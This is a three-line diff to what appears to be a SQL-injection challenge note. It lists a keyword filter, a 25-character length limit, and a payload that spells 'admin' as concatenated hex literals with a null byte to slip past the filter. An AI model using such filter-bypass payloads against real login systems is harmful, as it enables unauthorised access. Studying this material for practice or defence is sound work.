@@ -1,3 +1,3 @@
 Filter: or and true false union like = > < ; -- /* */ admin
 Length: <=25
-Payload: '||X'61646D'||X'696E'%00
+Payload: '||X'61646D696E'%00
